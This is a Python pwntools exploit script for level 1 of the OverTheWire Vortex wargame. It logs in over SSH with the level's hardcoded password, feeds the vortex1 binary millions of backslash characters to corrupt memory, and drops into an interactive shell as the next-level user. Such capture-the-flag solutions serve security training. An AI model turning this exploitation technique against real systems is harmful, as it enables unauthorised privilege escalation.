#!/usr/bin/python3
from pwn import *
import os
import time
import sys

#Level information for ssh
level = 1
USER = 'vortex%s' % level
HOST = 'vortex.labs.overthewire.org'
PASS = 'Gq#qu3bF3'
PORT = 2228

def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT, timeout=60)
    return sh

def execute_payload(sh):
    time.sleep(0.05)
    w = log.progress("Executing vortex1")
    shell = sh.run('/vortex/vortex1')
    b = log.progress("Sending backslashes")
    send_backslashes(shell, b)
    w.success("Complete")
    log.success("vortex2 shell established")
    shell.interactive()

def send_backslashes(sh, b):
    for stage in range(1, 77):
        sh.send("\\"*11783849)
        b.status("Stage " + str(stage))
    sh.send("x")
    b.success("All stages sent")

def local_payload():
    binary=ELF("vortex1")
    w = log.progress("Executing vortex 1")
    p = binary.process()
    b = log.progress("Sending backslashes")
    send_backslashes(p, b)
    p.interactive() 

if len(sys.argv) == 2 and sys.argv[1] == "local":
    local_payload()
else:
    sh = connect_to_level()
    execute_payload(sh)
